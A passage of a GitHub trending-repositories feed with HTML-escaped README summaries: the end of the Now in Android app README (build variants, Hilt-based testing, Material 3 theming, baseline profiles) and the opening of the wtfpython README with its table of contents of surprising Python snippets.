    <summary type="html">&lt;p&gt;A fully functional Android app built entirely with Kotlin and Jetpack Compose&lt;/p&gt;&lt;hr&gt;&lt;p&gt;&lt;img src=&#34;https://raw.githubusercontent.com/android/nowinandroid/main/docs/images/nia-splash.jpg&#34; alt=&#34;Now in Android&#34; title=&#34;Now in Android&#34;&gt;&lt;/p&gt; &#xA;&lt;h1&gt;Now in Android App [Work in progress 🚧]&lt;/h1&gt; &#xA;&lt;p&gt;This is the repository for the &lt;a href=&#34;https://developer.android.com/series/now-in-android&#34;&gt;Now in Android&lt;/a&gt; app.&lt;/p&gt; &#xA;&lt;p&gt;Now in Android is a fully functional Android app built entirely with Kotlin and Jetpack Compose. It follows Android design and development best practices and is intended to be a useful reference for developers. As a running app, it&#39;s intended to help developers keep up-to-date with the world of Android development by providing regular news updates.&lt;/p&gt; &#xA;&lt;p&gt;The app is currently in early stage development and is not yet available on the Play Store.&lt;/p&gt; &#xA;&lt;h1&gt;Features&lt;/h1&gt; &#xA;&lt;p&gt;Now in Android displays content from the &lt;a href=&#34;https://developer.android.com/series/now-in-android&#34;&gt;Now in Android&lt;/a&gt; series. Users can browse for links to recent videos, articles and other content. Users can also follow topics they are interested in or follow specific authors.&lt;/p&gt; &#xA;&lt;h2&gt;Screenshots&lt;/h2&gt; &#xA;&lt;p&gt;&lt;img src=&#34;https://raw.githubusercontent.com/android/nowinandroid/main/docs/images/screenshot-1-foryou.png&#34; alt=&#34;Screenshot showing For You screen&#34; title=&#34;Screenshot showing For You screen&#34;&gt; &lt;img src=&#34;https://raw.githubusercontent.com/android/nowinandroid/main/docs/images/screenshot-2-interests.png&#34; alt=&#34;Screenshot showing Interests screen&#34; title=&#34;Screenshot showing Interests screen&#34;&gt; &lt;img src=&#34;https://raw.githubusercontent.com/android/nowinandroid/main/docs/images/screenshot-3-topicdetail.png&#34; alt=&#34;Screenshot showing Topic detail screen&#34; title=&#34;Screenshot showing Topic detail screen&#34;&gt;&lt;/p&gt; &#xA;&lt;h1&gt;Development Environment&lt;/h1&gt; &#xA;&lt;p&gt;Now in Android uses the Gradle build system and can be imported directly into the latest stable version of Android Studio (available &lt;a href=&#34;https://developer.android.com/studio&#34;&gt;here&lt;/a&gt;). The &lt;code&gt;debug&lt;/code&gt; build can be built and run using the default configuration.&lt;/p&gt; &#xA;&lt;p&gt;Once you&#39;re up and running, you can refer to the learning journeys below to get a better understanding of which libraries and tools are being used, the reasoning behind the approaches to UI, testing, architecture and more, and how all of these different pieces of the project fit together to create a complete app.&lt;/p&gt; &#xA;&lt;p&gt;NOTE: Building the app using an M1 Mac will require the use of &lt;a href=&#34;https://support.apple.com/en-gb/HT211861&#34;&gt;Rosetta&lt;/a&gt;. See &lt;a href=&#34;https://github.com/protocolbuffers/protobuf/issues/9397#issuecomment-1086138036&#34;&gt;the following bug&lt;/a&gt; for more details.&lt;/p&gt; &#xA;&lt;h1&gt;Architecture&lt;/h1&gt; &#xA;&lt;p&gt;The Now in Android app follows the &lt;a href=&#34;https://developer.android.com/topic/architecture&#34;&gt;official architecture guidance&lt;/a&gt; and is described in detail in the &lt;a href=&#34;https://raw.githubusercontent.com/android/nowinandroid/main/docs/ArchitectureLearningJourney.md&#34;&gt;architecture learning journey&lt;/a&gt;.&lt;/p&gt; &#xA;&lt;h1&gt;Build&lt;/h1&gt; &#xA;&lt;p&gt;The &lt;code&gt;debug&lt;/code&gt; variant of &lt;code&gt;app&lt;/code&gt; uses local data to allow immediate building and exploring the UI.&lt;/p&gt; &#xA;&lt;p&gt;The &lt;code&gt;staging&lt;/code&gt; and &lt;code&gt;release&lt;/code&gt; variants of &lt;code&gt;app&lt;/code&gt; make real network calls to a backend server, providing up-to-date data as new episodes of Now in Android are released. At this time, there is not a public backend available.&lt;/p&gt; &#xA;&lt;p&gt;The &lt;code&gt;benchmark&lt;/code&gt; variant of &lt;code&gt;app&lt;/code&gt; is used to test startup performance and generate a baseline profile (see below for more information).&lt;/p&gt; &#xA;&lt;p&gt;&lt;code&gt;app-nia-catalog&lt;/code&gt; is a standalone app that displays the list of components that are stylized for Now in Android.&lt;/p&gt; &#xA;&lt;h1&gt;Testing&lt;/h1&gt; &#xA;&lt;p&gt;To facilitate testing of components, Now in Android uses dependency injection with &lt;a href=&#34;https://developer.android.com/training/dependency-injection/hilt-android&#34;&gt;Hilt&lt;/a&gt;.&lt;/p&gt; &#xA;&lt;p&gt;Most data layer components are defined as interfaces. Then, concrete implementations (with various dependencies) are bound to provide those interfaces to other components in the app. In tests, Now in Android notably does &lt;em&gt;not&lt;/em&gt; use any mocking libraries. Instead, the production implementations can be replaced with test doubles using Hilt&#39;s testing APIs (or via manual constructor injection for &lt;code&gt;ViewModel&lt;/code&gt; tests).&lt;/p&gt; &#xA;&lt;p&gt;These test doubles implement the same interface as the production implementations, and generally provide a simplified (but still realistic) implementation with additional testing hooks. This results in less brittle tests that may exercise more production code, instead of just verifying specific calls against mocks.&lt;/p&gt; &#xA;&lt;p&gt;Examples:&lt;/p&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt; &lt;p&gt;In instrumentation tests, a temporary folder is used to store the user&#39;s preferences, which is wiped after reach test. This allows using the real &lt;code&gt;DataStore&lt;/code&gt; and exercising all related code, instead of mocking the flow of data updates.&lt;/p&gt; &lt;/li&gt; &#xA; &lt;li&gt; &lt;p&gt;There are &lt;code&gt;Test&lt;/code&gt; implementations of each repository, which implement the normal, full repository interface and also provide test-only hooks. &lt;code&gt;ViewModel&lt;/code&gt; tests use these &lt;code&gt;Test&lt;/code&gt; repositories, and thus can use the test-only hooks to manipulate the the state of the &lt;code&gt;Test&lt;/code&gt; repository and verify the resulting behavior, instead of checking that specific repository methods were called.&lt;/p&gt; &lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h1&gt;UI&lt;/h1&gt; &#xA;&lt;p&gt;UI components are designed according to &lt;a href=&#34;https://m3.material.io/&#34;&gt;Material 3 guidelines&lt;/a&gt; and built entirely using &lt;a href=&#34;https://developer.android.com/jetpack/compose&#34;&gt;Jetpack Compose&lt;/a&gt;.&lt;/p&gt; &#xA;&lt;p&gt;The app has two themes:&lt;/p&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;Dynamic color - uses colors based on the &lt;a href=&#34;https://material.io/blog/announcing-material-you&#34;&gt;user&#39;s current color theme&lt;/a&gt; (if supported)&lt;/li&gt; &#xA; &lt;li&gt;Default theme - uses predefined colors when dynamic color is not supported&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;p&gt;Each theme also supports dark mode.&lt;/p&gt; &#xA;&lt;p&gt;The app uses adaptive layouts to &lt;a href=&#34;https://developer.android.com/guide/topics/large-screens/support-different-screen-sizes&#34;&gt;support different screen sizes&lt;/a&gt;.&lt;/p&gt; &#xA;&lt;p&gt;Find out more about the &lt;a href=&#34;https://raw.githubusercontent.com/android/nowinandroid/main/docs/ArchitectureLearningJourney.md#ui-layer&#34;&gt;UI architecture here&lt;/a&gt;.&lt;/p&gt; &#xA;&lt;h1&gt;Baseline profiles&lt;/h1&gt; &#xA;&lt;p&gt;The baseline profile for this app is located at &lt;a href=&#34;https://raw.githubusercontent.com/android/nowinandroid/main/app/src/main/baseline-prof.txt&#34;&gt;&lt;code&gt;app/src/main/baseline-prof.txt&lt;/code&gt;&lt;/a&gt;. It contains rules that enable AOT compilation of the critical user path taken during app launch. For more information on baseline profiles, read &lt;a href=&#34;https://developer.android.com/studio/profile/baselineprofiles&#34;&gt;this document&lt;/a&gt;.&lt;/p&gt; &#xA;&lt;blockquote&gt; &#xA; &lt;p&gt;Note: The baseline profile needs to be re-generated for release builds that touched code which changes app startup.&lt;/p&gt; &#xA;&lt;/blockquote&gt; &#xA;&lt;p&gt;To generate the baseline profile, select the &lt;code&gt;benchmark&lt;/code&gt; build variant and run the &lt;code&gt;BaselineProfileGenerator&lt;/code&gt; benchmark test on an AOSP Android Emulator. Then copy the resulting baseline profile from the emulator to &lt;a href=&#34;https://raw.githubusercontent.com/android/nowinandroid/main/app/src/main/baseline-prof.txt&#34;&gt;&lt;code&gt;app/src/main/baseline-prof.txt&lt;/code&gt;&lt;/a&gt;.&lt;/p&gt; &#xA;&lt;h1&gt;License&lt;/h1&gt; &#xA;&lt;p&gt;Now in Android is distributed under the terms of the Apache License (Version 2.0). See the &lt;a href=&#34;https://raw.githubusercontent.com/android/nowinandroid/main/LICENSE&#34;&gt;license&lt;/a&gt; for more information.&lt;/p&gt;</summary>
  </entry>
  <entry>
    <title>satwikkansal/wtfpython</title>
    <updated>2022-06-03T01:29:53Z</updated>
    <id>tag:github.com,2022-06-03:/satwikkansal/wtfpython</id>
    <link href="https://github.com/satwikkansal/wtfpython" rel="alternate"></link>
    <summary type="html">&lt;p&gt;What the f*ck Python? 😱&lt;/p&gt;&lt;hr&gt;&lt;p align=&#34;center&#34;&gt;&lt;img src=&#34;https://raw.githubusercontent.com/satwikkansal/wtfpython/master/images/logo.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt; &#xA;&lt;h1 align=&#34;center&#34;&gt;What the f*ck Python! 😱&lt;/h1&gt; &#xA;&lt;p align=&#34;center&#34;&gt;Exploring and understanding Python through surprising snippets.&lt;/p&gt; &#xA;&lt;p&gt;Translations: &lt;a href=&#34;https://github.com/robertparley/wtfpython-cn&#34;&gt;Chinese 中文&lt;/a&gt; | &lt;a href=&#34;https://github.com/vuduclyunitn/wtfptyhon-vi&#34;&gt;Vietnamese Tiếng Việt&lt;/a&gt; | &lt;a href=&#34;https://web.archive.org/web/20220511161045/https://github.com/JoseDeFreitas/wtfpython-es&#34;&gt;Spanish Español&lt;/a&gt; | &lt;a href=&#34;https://github.com/buttercrab/wtfpython-ko&#34;&gt;Korean 한국어&lt;/a&gt; | &lt;a href=&#34;https://github.com/satwikkansal/wtfpython/issues/new?title=Add%20translation%20for%20%5BLANGUAGE%5D&amp;amp;body=Expected%20time%20to%20finish:%20%5BX%5D%20weeks.%20I%27ll%20start%20working%20on%20it%20from%20%5BY%5D.&#34;&gt;Add translation&lt;/a&gt;&lt;/p&gt; &#xA;&lt;p&gt;Other modes: &lt;a href=&#34;https://colab.research.google.com/github/satwikkansal/wtfpython/blob/master/irrelevant/wtf.ipynb&#34;&gt;Interactive&lt;/a&gt; | &lt;a href=&#34;https://pypi.python.org/pypi/wtfpython&#34;&gt;CLI&lt;/a&gt;&lt;/p&gt; &#xA;&lt;p&gt;Python, being a beautifully designed high-level and interpreter-based programming language, provides us with many features for the programmer&#39;s comfort. But sometimes, the outcomes of a Python snippet may not seem obvious at first sight.&lt;/p&gt; &#xA;&lt;p&gt;Here&#39;s a fun project attempting to explain what exactly is happening under the hood for some counter-intuitive snippets and lesser-known features in Python.&lt;/p&gt; &#xA;&lt;p&gt;While some of the examples you see below may not be WTFs in the truest sense, but they&#39;ll reveal some of the interesting parts of Python that you might be unaware of. I find it a nice way to learn the internals of a programming language, and I believe that you&#39;ll find it interesting too!&lt;/p&gt; &#xA;&lt;p&gt;If you&#39;re an experienced Python programmer, you can take it as a challenge to get most of them right in the first attempt. You may have already experienced some of them before, and I might be able to revive sweet old memories of yours! &lt;span&gt;😅&lt;/span&gt;&lt;/p&gt; &#xA;&lt;p&gt;PS: If you&#39;re a returning reader, you can learn about the new modifications &lt;a href=&#34;https://github.com/satwikkansal/wtfpython/releases/&#34;&gt;here&lt;/a&gt; (the examples marked with asterisk are the ones added in the latest major revision).&lt;/p&gt; &#xA;&lt;p&gt;So, here we go...&lt;/p&gt; &#xA;&lt;h1&gt;Table of Contents&lt;/h1&gt; &#xA;&lt;!-- Generated using &#34;markdown-toc -i README.md --maxdepth 3&#34;--&gt; &#xA;&lt;!-- toc --&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/satwikkansal/wtfpython/master/#structure-of-the-examples&#34;&gt;Structure of the Examples&lt;/a&gt; &#xA;  &lt;ul&gt; &#xA;   &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/satwikkansal/wtfpython/master/#-some-fancy-title&#34;&gt;▶ Some fancy Title&lt;/a&gt;&lt;/li&gt; &#xA;  &lt;/ul&gt; &lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/satwikkansal/wtfpython/master/#usage&#34;&gt;Usage&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/satwikkansal/wtfpython/master/#-examples&#34;&gt;👀 Examples&lt;/a&gt; &#xA;  &lt;ul&gt; &#xA;   &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/satwikkansal/wtfpython/master/#section-strain-your-brain&#34;&gt;Section: Strain your brain!&lt;/a&gt; &#xA;    &lt;ul&gt; &#xA;     &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/satwikkansal/wtfpython/master/#-first-things-first-&#34;&gt;▶ First things first! *&lt;/a&gt;&lt;/li&gt; &#xA;     &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/satwikkansal/wtfpython/master/#-strings-can-be-tricky-sometimes&#34;&gt;▶ Strings can be tricky sometimes&lt;/a&gt;&lt;/li&gt; &#xA;     &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/satwikkansal/wtfpython/master/#-be-careful-with-chained-operations&#34;&gt;▶ Be careful with chained operations&lt;/a&gt;&lt;/li&gt; &#xA;     &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/satwikkansal/wtfpython/master/#-how-not-to-use-is-operator&#34;&gt;▶ How not to use &lt;code&gt;is&lt;/code&gt; operator&lt;/a&gt;&lt;/li&gt; &#xA;     &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/satwikkansal/wtfpython/master/#-hash-brownies&#34;&gt;▶ Hash brownies&lt;/a&gt;&lt;/li&gt; &#xA;     &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/satwikkansal/wtfpython/master/#-deep-down-were-all-the-same&#34;&gt;▶ Deep down, we&#39;re all the same.&lt;/a&gt;&lt;/li&gt; &#xA;     &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/satwikkansal/wtfpython/master/#-disorder-within-order-&#34;&gt;▶ Disorder within order *&lt;/a&gt;&lt;/li&gt; &#xA;     &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/satwikkansal/wtfpython/master/#-keep-trying-&#34;&gt;▶ Keep trying... *&lt;/a&gt;&lt;/li&gt; &#xA;     &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/satwikkansal/wtfpython/master/#-for-what&#34;&gt;▶ For what?&lt;/a&gt;&lt;/li&gt; &#xA;     &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/satwikkansal/wtfpython/master/#-evaluation-time-discrepancy&#34;&gt;▶ Evaluation time discrepancy&lt;/a&gt;&lt;/li&gt; &#xA;     &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/satwikkansal/wtfpython/master/#-is-not--is-not-is-not-&#34;&gt;▶ &lt;code&gt;is not ...&lt;/code&gt; is not &lt;code&gt;is (not ...)&lt;/code&gt;&lt;/a&gt;&lt;/li&gt; &#xA;     &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/satwikkansal/wtfpython/master/#-a-tic-tac-toe-where-x-wins-in-the-first-attempt&#34;&gt;▶ A tic-tac-toe where X wins in the first attempt!&lt;/a&gt;&lt;/li&gt; &#xA;     &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/satwikkansal/wtfpython/master/#-schr%C3%B6dingers-variable-&#34;&gt;▶ Schrödinger&#39;s variable&lt;/a&gt;&lt;/li&gt; &#xA;     &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/satwikkansal/wtfpython/master/#-the-chicken-egg-problem-&#34;&gt;▶ The chicken-egg problem *&lt;/a&gt;&lt;/li&gt; &#xA;     &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/satwikkansal/wtfpython/master/#-subclass-relationships&#34;&gt;▶ Subclass relationships&lt;/a&gt;&lt;/li&gt; &#xA;     &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/satwikkansal/wtfpython/master/#-methods-equality-and-identity&#34;&gt;▶ Methods equality and identity&lt;/a&gt;&lt;/li&gt; &#xA;     &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/satwikkansal/wtfpython/master/#-all-true-ation-&#34;&gt;▶ All-true-ation *&lt;/a&gt;&lt;/li&gt; &#xA;     &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/satwikkansal/wtfpython/master/#-the-surprising-comma&#34;&gt;▶ The surprising comma&lt;/a&gt;&lt;/li&gt; &#xA;     &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/satwikkansal/wtfpython/master/#-strings-and-the-backslashes&#34;&gt;▶ Strings and the backslashes&lt;/a&gt;&lt;/li&gt; &#xA;     &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/satwikkansal/wtfpython/master/#-not-knot&#34;&gt;▶ not knot!&lt;/a&gt;&lt;/li&gt; &#xA;     &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/satwikkansal/wtfpython/master/#-half-triple-quoted-strings&#34;&gt;▶ Half triple-quoted strings&lt;/a&gt;&lt;/li&gt; &#xA;     &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/satwikkansal/wtfpython/master/#-whats-wrong-with-booleans&#34;&gt;▶ What&#39;s wrong with booleans?&lt;/a&gt;&lt;/li&gt; &#xA;     &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/satwikkansal/wtfpython/master/#-class-attributes-and-instance-attributes&#34;&gt;▶ Class attributes and instance attributes&lt;/a&gt;&lt;/li&gt; &#xA;     &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/satwikkansal/wtfpython/master/#-yielding-none&#34;&gt;▶ yielding None&lt;/a&gt;&lt;/li&gt; &#xA;     &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/satwikkansal/wtfpython/master/#-yielding-from-return-&#34;&gt;▶ Yielding from... return! *&lt;/a&gt;&lt;/li&gt; &#xA;     &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/satwikkansal/wtfpython/master/#-nan-reflexivity-&#34;&gt;▶ Nan-reflexivity *&lt;/a&gt;&lt;/li&gt; &#xA;     &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/satwikkansal/wtfpython/master/#-mutating-the-immutable&#34;&gt;▶ Mutating the immutable!&lt;/a&gt;&lt;/li&gt; &#xA;     &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/satwikkansal/wtfpython/master/#-the-disappearing-variable-from-outer-scope&#34;&gt;▶ The disappearing variable from outer scope&lt;/a&gt;&lt;/li&gt; &#xA;     &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/satwikkansal/wtfpython/master/#-the-mysterious-key-type-conversion&#34;&gt;▶ The mysterious key type conversion&lt;/a&gt;&lt;/li&gt; &#xA;     &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/satwikkansal/wtfpython/master/#-lets-see-if-you-can-guess-this&#34;&gt;▶ Let&#39;s see if you can guess this?&lt;/a&gt;&lt;/li&gt; &#xA;    &lt;/ul&gt; &lt;/li&gt; &#xA;   &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/satwikkansal/wtfpython/master/#section-slippery-slopes&#34;&gt;Section: Slippery Slopes&lt;/a&gt; &#xA;    &lt;ul&gt; &#xA;     &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/satwikkansal/wtfpython/master/#-modifying-a-dictionary-while-iterating-over-it&#34;&gt;▶ Modifying a dictionary while iterating over it&lt;/a&gt;&lt;/li&gt; &#xA;     &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/satwikkansal/wtfpython/master/#-stubborn-del-operation&#34;&gt;▶ Stubborn &lt;code&gt;del&lt;/code&gt; operation&lt;/a&gt;&lt;/li&gt; &#xA;     &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/satwikkansal/wtfpython/master/#-the-out-of-scope-variable&#34;&gt;▶ The out of scope variable&lt;/a&gt;&lt;/li&gt; &#xA;     &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/satwikkansal/wtfpython/master/#-deleting-a-list-item-while-iterating&#34;&gt;▶ Deleting a list item while iterating&lt;/a&gt;&lt;/li&gt; &#xA;     &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/satwikkansal/wtfpython/master/#-lossy-zip-of-iterators-&#34;&gt;▶ Lossy zip of iterators *&lt;/a&gt;&lt;/li&gt; &#xA;     &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/satwikkansal/wtfpython/master/#-loop-variables-leaking-out&#34;&gt;▶ Loop variables leaking out!&lt;/a&gt;&lt;/li&gt; &#xA;     &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/satwikkansal/wtfpython/master/#-beware-of-default-mutable-arguments&#34;&gt;▶ Beware of default mutable arguments!&lt;/a&gt;&lt;/li&gt; &#xA;     &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/satwikkansal/wtfpython/master/#-catching-the-exceptions&#34;&gt;▶ Catching the Exceptions&lt;/a&gt;&lt;/li&gt; &#xA;     &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/satwikkansal/wtfpython/master/#-same-operands-different-story&#34;&gt;▶ Same operands, different story!&lt;/a&gt;&lt;/li&gt; &#xA;     &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/satwikkansal/wtfpython/master/#-name-resolution-ignoring-class-scope&#34;&gt;▶ Name resolution ignoring class scope&lt;/a&gt;&lt;/li&gt; &#xA;     &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/satwikkansal/wtfpython/master/#-rounding-like-a-banker-&#34;&gt;▶ Rounding like a banker *&lt;/a&gt;&lt;/li&gt; &#xA;     &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/satwikkansal/wtfpython/master/#-needles-in-a-haystack-&#34;&gt;▶ Needles in a Haystack *&lt;/a&gt;&lt;/li&gt; &#xA;     &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/satwikkansal/wtfpython/master/#-splitsies-&#34;&gt;▶ Splitsies *&lt;/a&gt;&lt;/li&gt; &#xA;     &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/satwikkansal/wtfpython/master/#-wild-imports-&#34;&gt;▶ Wild imports *&lt;/a&gt;&lt;/li&gt; &#xA;     &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/satwikkansal/wtfpython/master/#-all-sorted-&#34;&gt;▶ All sorted? *&lt;/a&gt;&lt;/li&gt; &#xA;     &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/satwikkansal/wtfpython/master/#-midnight-time-doesnt-exist&#34;&gt;▶ Midnight time doesn&#39;t exist?&lt;/a&gt;&lt;/li&gt; &#xA;    &lt;/ul&gt; &lt;/li&gt; &#xA;   &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/satwikkansal/wtfpython/master/#section-the-hidden-treasures&#34;&gt;Section: The Hidden treasures!&lt;/a&gt; &#xA;    &lt;ul&gt; &#xA;     &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/satwikkansal/wtfpython/master/#-okay-python-can-you-make-me-fly&#34;&gt;▶ Okay Python, Can you make me fly?&lt;/a&gt;&lt;/li&gt; &#xA;     &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/satwikkansal/wtfpython/master/#-goto-but-why&#34;&gt;▶ &lt;code&gt;goto&lt;/code&gt;, but why?&lt;/a&gt;&lt;/li&gt; &#xA;     &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/satwikkansal/wtfpython/master/#-brace-yourself&#34;&gt;▶ Brace yourself!&lt;/a&gt;&lt;/li&gt; &#xA;     &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/satwikkansal/wtfpython/master/#-lets-meet-friendly-language-uncle-for-life&#34;&gt;▶ Let&#39;s meet Friendly Language Uncle For Life&lt;/a&gt;&lt;/li&gt; &#xA;     &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/satwikkansal/wtfpython/master/#-even-python-understands-that-love-is-complicated&#34;&gt;▶ Even Python understands that love is complicated&lt;/a&gt;&lt;/li&gt; &#xA;     &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/satwikkansal/wtfpython/master/#-yes-it-exists&#34;&gt;▶ Yes, it exists!&lt;/a&gt;&lt;/li&gt; &#xA;     &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/satwikkansal/wtfpython/master/#-ellipsis-&#34;&gt;▶ Ellipsis *&lt;/a&gt;&lt;/li&gt; &#xA;     &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/satwikkansal/wtfpython/master/#-inpinity&#34;&gt;▶ Inpinity&lt;/a&gt;&lt;/li&gt; &#xA;     &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/satwikkansal/wtfpython/master/#-lets-mangle&#34;&gt;▶ Let&#39;s mangle&lt;/a&gt;&lt;/li&gt; &#xA;    &lt;/ul&gt; &lt;/li&gt; &#xA;   &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/satwikkansal/wtfpython/master/#section-appearances-are-deceptive&#34;&gt;Section: Appearances are deceptive!&lt;/a&gt; &#xA;    &lt;ul&gt; &#xA;     &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/satwikkansal/wtfpython/master/#-skipping-lines&#34;&gt;▶ Skipping lines?&lt;/a&gt;&lt;/li&gt; &#xA;     &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/satwikkansal/wtfpython/master/#-teleportation&#34;&gt;▶ Teleportation&lt;/a&gt;&lt;/li&gt; &#xA;     &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/satwikkansal/wtfpython/master/#-well-something-is-fishy&#34;&gt;▶ Well, something is fishy...&lt;/a&gt;&lt;/li&gt; &#xA;    &lt;/ul&gt; &lt;/li&gt; &#xA;   &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/satwikkansal/wtfpython/master/#section-miscellaneous&#34;&gt;Section: Miscellaneous&lt;/a&gt; &#xA;    &lt;ul&gt; &#xA;     &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/satwikkansal/wtfpython/master/#--is-faster&#34;&gt;▶ &lt;code&gt;+=&lt;/code&gt; is faster&lt;/a&gt;&lt;/li&gt; &#xA;     &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/satwikkansal/wtfpython/master/#-lets-make-a-giant-string&#34;&gt;▶ Let&#39;s make a giant string!&lt;/a&gt;&lt;/li&gt; &#xA;     &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/satwikkansal/wtfpython/master/#-slowing-down-dict-lookups-&#34;&gt;▶ Slowing down &lt;code&gt;dict&lt;/code&gt; lookups *&lt;/a&gt;&lt;/li&gt; &#xA;     &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/satwikkansal/wtfpython/master/#-bloating-instance-dicts-&#34;&gt;▶ Bloating instance &lt;code&gt;dict&lt;/code&gt;s *&lt;/a&gt;&lt;/li&gt; &#xA;     &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/satwikkansal/wtfpython/master/#-minor-ones-&#34;&gt;▶ Minor Ones *&lt;/a&gt;&lt;/li&gt; &#xA;    &lt;/ul&gt; &lt;/li&gt; &#xA;  &lt;/ul&gt; &lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/satwikkansal/wtfpython/master/#contributing&#34;&gt;Contributing&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/satwikkansal/wtfpython/master/#acknowledgements&#34;&gt;Acknowledgements&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/satwikkansal/wtfpython/master/#-license&#34;&gt;🎓 License&lt;/a&gt; &#xA;  &lt;ul&gt; &#xA;   &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/satwikkansal/wtfpython/master/#surprise-your-friends-as-well&#34;&gt;Surprise your friends as well!&lt;/a&gt;&lt;/li&gt; &#xA;   &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/satwikkansal/wtfpython/master/#more-content-like-this&#34;&gt;More content like this?&lt;/a&gt;&lt;/li&gt; &#xA;  &lt;/ul&gt; &lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;!-- tocstop --&gt; &#xA;&lt;h1&gt;Structure of the Examples&lt;/h1&gt; &#xA;&lt;p&gt;All the examples are structured like below:&lt;/p&gt; &#xA;&lt;blockquote&gt; &#xA; &lt;h3&gt;▶ Some fancy Title&lt;/h3&gt; &#xA; &lt;pre&gt;&lt;code class=&#34;language-py&#34;&gt;# Set up the code.&#xA;# Preparation for the magic...&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA; &lt;p&gt;&lt;strong&gt;Output (Python version(s)):&lt;/strong&gt;&lt;/p&gt; &#xA; &lt;pre&gt;&lt;code class=&#34;language-py&#34;&gt;&amp;gt;&amp;gt;&amp;gt; triggering_statement&#xA;Some unexpected output&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA; &lt;p&gt;(Optional): One line describing the unexpected output.&lt;/p&gt; &#xA; &lt;h4&gt;💡 Explanation:&lt;/h4&gt; &#xA; 